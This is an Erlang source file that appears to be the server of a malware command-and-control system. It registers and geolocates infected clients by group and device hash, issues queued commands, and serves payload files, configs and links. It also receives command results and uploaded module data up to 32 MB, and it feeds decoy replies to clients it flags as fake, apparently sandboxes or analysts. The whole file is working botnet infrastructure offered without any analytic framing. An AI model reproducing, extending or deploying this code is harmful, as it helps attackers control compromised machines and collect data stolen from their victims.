-module(http_handler).

-export([
  init/3,
  handle/2,
  terminate/3
]).

-include("client.hrl").
-include("client_command.hrl").
-include("client_file.hrl").
-include("client_config.hrl").
-include("client_event.hrl").
-include_lib("egeoip/include/egeoip.hrl").

-define(IS_REQ(Req), element(1, Req) =:= http_req).

init(_Type, Req, []) ->
	{ok, Req, undefined}.

handle(Req, State) ->
	T = erlang:monotonic_time(microsecond),
	{ Path, Req0} = cowboy_req:path(Req),
	{ {IP, _ }, Req1} = cowboy_req:peer(Req0),
	{ _Activity, Req2 } = case client_blacklist:is_valid(IP) of
		true ->
			%% lager:info("HTTP req: ~s", [ Path ]),
			Split0 = binary:split(Path, <<"/">>, [global]),
			Split1 = [ decode_uri(Part) || Part <- Split0 ],
			case Split1 of
				[ <<"">>, GroupTag, ClientId, Command | Args ] ->
					Client = case client_cache:get(ClientId) of
						undefined ->
							#client{
								client_id = ClientId,
								group = GroupTag,
								is_authorized = false
							};
						{ ok, C } ->
							C#client{
								group = GroupTag
							}
					end,
					try
						lager:info("HTTP command ~p, ~p, ~p ", [ Command, Args, Client ]),
						{{Activity, _Req3} = Response, NewClient3 } = command(Command, Args, Client, Req1),
						case Activity =:= 200 orelse Activity =:= 404 of
							true -> client:update_activity(NewClient3);
							false -> ok
						end,
						Response
					catch
						error:Error ->
							lager:critical("Error ~p ~p", [ Error, erlang:get_stacktrace() ]),
							reply(forbidden, Req1);
						throw:{_, ReqErr} = Throw when ?IS_REQ(ReqErr) ->
							Throw;
						throw:ignore ->
							reply(bad_request, Req1);
						throw:Result ->
							lager:critical("Error: Throw ~p ~p", [ Result, erlang:get_stacktrace() ]),
							reply(forbidden, Req1)
					end;
				_ ->
					reply(forbidden, Req1)
			end;
		false ->
			reply(teapot, Req0)
		end,
		lager:info("Time path ~s:~p", [ Path, erlang:monotonic_time(microsecond) - T ]),
		{ ok, Req2, State }.

terminate(_Reason, _Req, _State) ->
	ok.

%%  инициализация цикла команд
command(_, [ <<>> | _ ], Client, Req) ->
	{ reply(forbidden, Req), Client };
command(<<"0">>, [ SystemVersion, ClientVersion, ClientIp, BinDevHash, Token | _ ], Client, Req) ->
	DevHash = try
		   <<(binary_to_integer(BinDevHash, 16)):256/unsigned-integer>>
		catch
			error:badarg ->
				throw(reply(forbidden, Req))
	end,
	Country = case egeoip:lookup(binary_to_list(ClientIp)) of
		{ ok, #geoip{ country_code = C }} when C =/= undefined -> list_to_binary(C);
		_ -> <<>>
	end,
	{ _, NewClient0} = get_cached(Client),
	{ ok, IpParsed } = inet:parse_address(binary_to_list(ClientIp)),
	NewClient1 = NewClient0#client{
		sys_ver = SystemVersion,
		client_ver = binary_to_integer(ClientVersion),
		ip = ClientIp,
		ip_parsed = IpParsed,
		country = Country,
		devhash = DevHash,
		is_authorized = true
	},
	NewClient2 = case client:get_info(NewClient1) of
		{ ok, NewC } ->
			{ ok, NewC1 } = client:update_info(client:do_login(client:merge(NewClient1, NewC))),
			NewC1;
		{ newbie, NewC0 } ->
			{ ok, NewC1 } = client:create_info(client:do_login(NewC0)),
			NewC1
	end,
	File = case client_file:get(<<"extcfg">>, NewClient2) of
		{ ok, F } -> F#client_file.content;
		undefined ->
			throw(reply(forbidden, Req))
	end,
	client_log:add(in, <<"0">>,[ ClientVersion, <<" ">>, ClientIp, <<" ">>, NewClient2#client.group ], NewClient2),

	DevHashDup = case client:check_devhash_dup(NewClient2) of
		true -> [ devhash_dup ];
		false -> []
	end,
	%% lager:info("Country ~p ~p ~p", [  ClientIp, NewClient0#client.country, Country ]),
	GeoChange = case NewClient0#client.country =/= Country andalso Country =/= <<>> andalso NewClient0#client.country =/= <<>>  of
		true -> [ geo_change ];
		false -> []
	end,
	IsFake = client_filter:is_fake(NewClient2, #{}),
	NewClient3 = client_event:fire([ online, age, geo ] ++ DevHashDup ++ GeoChange, NewClient2#client{
		is_fake = IsFake
	}),
  client_cache:put(NewClient3),

	Reply = <<"/1/",
		(NewClient2#client.group)/binary,"/",
		(NewClient2#client.client_id)/binary, "/",
		Token/binary, "/",
		(integer_to_binary(size(File)))/binary, "/\r\n",
		File/binary, "\r\n"
	>>,

	{ reply({ text, sign(Reply)}, Req), NewClient3 };

%% выдача клиенту команды
command(<<"1">>, [ Token | _ ], Client, Req) when ?IS_FAKE(Client) ->
	{ reply({text, <<"/1/">>}, Req), Client };

command(<<"1">>, [ Token | _ ], Client, Req) ->
	NewClient = get_cached_throw(Client, Req),
	R = case client_command:get(NewClient) of
		{ ok, #client_command{
			incode = Incode, id = Id, params = Params
		}} ->
			IncodeBin = integer_to_binary(Incode),
			Reply = <<"/",
				(IncodeBin)/binary, "/",
				(Client#client.group)/binary, "/",
				(Client#client.client_id)/binary,	"/",
				Token/binary, "/",
				(integer_to_binary(Id))/binary, "/\r\n",
				Params/binary, "\r\n"
			>>,
			client_log:add(out, <<"1">>, IncodeBin, NewClient),
			reply({text, sign(Reply)}, Req);
		_ ->
			reply({text, <<"/1/">>}, Req)
	end,
	NewClient1 = client_event:fire(age, NewClient),
	{ R, NewClient1 };

%% выдача клиенту файла
command(<<"5">>, [ Filename | _ ], Client,Req) ->
	{ _, NewClient } = get_cached(Client),
	if ?IS_FAKE(Client) andalso Filename =/= <<"spk">> -> throw(reply(not_found, Req));
		true -> ok
	end,
	Reply = case client_file:get(Filename, NewClient) of
		{ ok, File } ->
			client_log:add(out, <<"5">>, [File#client_file.filename , <<" ">>,  integer_to_binary(File#client_file.id) ], NewClient),
			reply({binary, File#client_file.content}, Req);
		undefined ->
			client_log:add(out, <<"5">>, [ Filename, <<" not_exist">> ], NewClient),
			reply(not_found, Req)
	end,
	{ Reply, NewClient };

%% получение от клиента отчёта о выполненной им команды
command(<<"10">>, [ IncodeBin, CmdIdBin, ResultCode | _ ], Client, Req) ->
	Incode = ignore(fun() -> binary_to_integer(IncodeBin) end),
	CmdId = ignore(fun() -> binary_to_integer(CmdIdBin) end),
	NewClient = get_cached_throw(Client, Req),
	NewClient1 = case client:get_info(NewClient) of
		{ ok, C } ->
			client_log:add(in, <<"10">>, [CmdIdBin, <<" ">>, ResultCode], C),
			client_command:set_result(C, CmdId, Incode, ResultCode),
			client_event:fire(command_complete, NewClient);
		_ ->
			NewClient
	end,
	{ reply({text, <<"/1/">>}, Req), NewClient1 };

%% сохранение ключа
command(<<"14">>, [ Name, Value, <<"0">> | _ ], Client, Req) ->
	NewClient = get_cached_throw(Client, Req),
	case client:get_info(NewClient) of
		{ ok, C } ->
			client_log:add(in, <<"14">>, Name, NewClient),
			client_storage:set(Name, Value, C);
		_ -> ok
	end,
	{ reply({ text, <<"/1/">>}, Req), NewClient };

command(<<"15">>, [ Name | _ ], Client, Req) ->
	NewClient = get_cached_throw(Client, Req),
	case client:get_info(NewClient) of
		{ ok, C } ->
			client_log:add(in, <<"15">>, Name, NewClient),
			case client_storage:get(Name, C) of
				{ ok, Value } ->
					{ reply, { text, Value }, NewClient };
				undefined ->
					{ reply, no_content, NewClient }
			end;
		_ -> { reply, forbidden, NewClient }
	end;


% выдача клиенту конфига
command(<<"23">>, _, Client, Req) when ?IS_FAKE(Client) ->
	{ reply(not_found, Req), Client };

command(<<"23">>, [ BinConfigVersion | _ ], Client, Req) ->
	V = binary_to_integer(BinConfigVersion),
	NewClient = get_cached_throw(Client, Req),
	R = case client_config:get(V, NewClient) of
		{ ok, #client_config{ version = Version, content = Content, id = Id }} ->
			VersionBin = integer_to_binary(Version),
			Reply = <<"/23/",
					(NewClient#client.group)/binary, "/",
					(NewClient#client.client_id)/binary,	"/",
					(VersionBin)/binary, "/",
					(integer_to_binary(size(Content)))/binary,
					"/\r\n", Content/binary, "\r\n">>,
			client_log:add(out, <<"23">>, [ BinConfigVersion, <<" ">>, VersionBin, <<" ">>, integer_to_binary(Id) ], NewClient),
			reply({text, sign(Reply)}, Req);
	  undefined ->
			client_log:add(out, <<"23">>, [ BinConfigVersion, <<" not_exist">> ], NewClient),
			reply(not_found, Req)
	end,
	{ R, NewClient };

% выдача клиенту ссылки
command(<<"23">>, _, Client, Req) when ?IS_FAKE(Client) ->
	{ reply(not_found, Req), Client };

command(<<"25">>, [ Token | _ ], Client, Req) when Token =/= <<>> ->
	NewClient = get_cached_throw(Client, Req),
	R = case client_link:get(NewClient) of
		{ ok, { Id, Url }} ->
			Reply = <<"/25/",
					(NewClient#client.group)/binary, "/",
					(NewClient#client.client_id)/binary,	"/",
					Token/binary,
					"/\r\n",
					Url/binary,
					"\r\n">>,
			client_log:add(out, <<"25">>, integer_to_binary(Id), NewClient),
			reply({text, sign(Reply)}, Req);
		undefined ->
			client_log:add(out, <<"25">>, <<"not_exist">>, NewClient),
      reply(not_found, Req)
  end,
	{ R, NewClient };

% приём данных модуля.
command(<<"63">>, [ Name, <<>> ], Client, Req) ->
	command(<<"63">>, [ Name ], Client, Req);
command(<<"63">>, [ Name ], Client, Req) ->
	command(<<"63">>, [ Name, undefined, undefined, undefined ], Client, Req);
command(<<"63">>, [ Name, Ctl, CtlResult, AuxTag | _ ], Client, Req) ->
	NewClient = get_cached_throw(Client, Req),
	client_log:add(in, <<"63">>, [ Name, <<" ">>,to_binary(Ctl) ], NewClient),
	{ Body, Req1 } = case cowboy_req:parse_header(<<"content-type">>, Req) of
			{ok, {<<"multipart">>, <<"form-data">>, _}, Req00} ->
				true = cowboy_req:has_body(Req00),
				{ ok, Headers, Req01 } = cowboy_req:part(Req00,	[
					{length, 32 * 1024 * 1024}, %% 32 Mb
					{read_length, 32 * 1024 * 1024},
					{read_timeout, 60000}]),
				{ ok, Data3, Req02} = cowboy_req:part_body(Req01),
				Data4 = case cow_multipart:form_data(Headers) of
					{ data, <<"noname">> } -> Data3;
					{ file, <<"noname">>, _, _, _ } -> Data3;
					_ -> undefined
				end,
				{ Data4, Req02 };
			{ ok, undefined, Req00 } ->
				{ undefined, Req00 }
	end,
	{ ok, _ } = client_module_data:insert(NewClient, Name, Ctl, ignore(fun() -> base64:decode(CtlResult) end), AuxTag, Body),
	{ reply({text, <<"/1/">>}, Req1), NewClient };

command(<<"64">>, [ ModuleName, EventName ], Client, Req) ->
	command(<<"64">>, [ ModuleName, EventName, <<>> ], Client, Req);
command(<<"64">>, [ ModuleName, EventName, AuxTag | _ ], Client, Req) ->
	NewClient = get_cached_throw(Client, Req),
	client_log:add(in, <<"64">>, [ ModuleName, <<" ">>, EventName, <<" ">>, AuxTag ], NewClient),
	{ Info, Data, NReq } = case cowboy_req:parse_header(<<"content-type">>, Req) of
			{ok, {<<"multipart">>, <<"form-data">>, _}, Req00} ->
				true = cowboy_req:has_body(Req00),
				{ List, Req01 } = get_streams(Req00,[
					{length, 32 * 1024 * 1024}, %% 32 Mb
					{read_length, 32 * 1024 * 1024},
					{read_timeout, 60000}]),
				{ proplists:get_value(<<"info">>, List, null),
				  proplists:get_value(<<"data">>, List, null),
				  Req01
				};
			{	_, undefined, Req0 } ->
				{ null, null, Req0 }
	end,
	client_event_db:insert(#client_event{
		client_id = NewClient#client.id,
		module = ModuleName,
		event = EventName,
		tag = AuxTag,
		info = Info,
		data = Data
	}),
	Commands = client_event_commands_cache:command(NewClient, ModuleName, EventName, Info),
	{ok, _ } = client_command:insert(Commands),
	{ reply(<<"/1/">>, NReq), NewClient };

command(_, _, Client, Req) ->
	{ reply(forbidden, Req), Client }.

reply({text, Text}, Req) ->
	{ ok, Req1 } = cowboy_req:reply(200, [
		{<<"Content-Type">>, <<"text/plain">> }
	], Text, Req),
	{ 200, Req1 };

reply({binary, Binary}, Req) ->
	{ ok, Req1 } = cowboy_req:reply(200, [
		{<<"Content-Type">>, <<"application/octet-stream">> }
	], Binary, Req),
	{ 200, Req1 };

reply(not_found, Req) ->
  	{ ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
	{ 404, Req1 };

reply(forbidden, Req) ->
  	{ ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden">>, Req),
	{ 403, Req1 };

reply(no_content, Req) ->
	{ ok, Req1 } = cowboy_req:reply(204, [], <<"No content">>, Req),
	{ 403, Req1 };

reply(bad_request, Req) ->
	{ ok, Req1 } = cowboy_req:reply(403, [], <<"Bad request">>, Req),
	{ 403, Req1 };

reply(teapot, Req) ->
	{ ok, Req1 } = cowboy_req:reply(418, [], <<>>, Req),
	{ 418, Req1 };

reply(Bin, Req) when is_binary(Bin) ->
	reply({text, Bin}, Req).

server_sign(_Body) ->
	<<"1234567890">>.

sign(Body) ->
	<<Body/binary, (server_sign(Body))/binary>>.

decode_uri(<<"">>) -> <<"">>;
decode_uri(Uri) ->
	cow_qs:urldecode(Uri).

get_cached(Client) ->
	case ignore(fun() -> client:get_info(Client) end) of
		{ ok, Client1 } ->
			Timeout = cmd_server_app:env(auth_timeout),
			case time:now() - Client1#client.logged_at of
				Time when Time =< Timeout ->
					{ ok, Client1 };
				_ -> { error, Client }
			end;
		_ -> { error, Client }
	end.

get_cached_throw(Client, Req) ->
	case get_cached(Client) of
		{ ok, Client1 } -> Client1;
		{ error, _ } -> throw(reply(forbidden, Req))
	end.

to_binary(undefined) -> <<>>;
to_binary(Bin) when is_binary(Bin) -> Bin.


get_stream(Req, Opts) ->
	case cowboy_req:part(Req,	Opts) of
		{ ok, Headers, Req01 } ->
			{ ok, Data3, Req02} = cowboy_req:part_body(Req01),
			Result = case cow_multipart:form_data(Headers) of
				{ data, Field } -> { ok, Field, Data3} ;
				{ file, Field, _, _, _ } -> { ok, Field, Data3 };
				_ -> undefined
			end,
			{ Result, Req02 };
		{ done, Req01 } ->
			{ undefined, Req01 }
	end.

get_streams(Req, Opts) ->
	get_streams(Req, Opts, []).

get_streams(Req, Opts, Acc) ->
	{ Result, Req1 } = get_stream(Req, Opts),
  case Result of
		{ ok, Field, Data } -> get_streams(Req1, Opts, [ {Field, Data} | Acc ]);
		undefined -> { Acc, Req1 }
	end.

ignore(Fun) ->
	try
		Fun()
	catch
		_:_ ->
			throw(ignore)
	end.
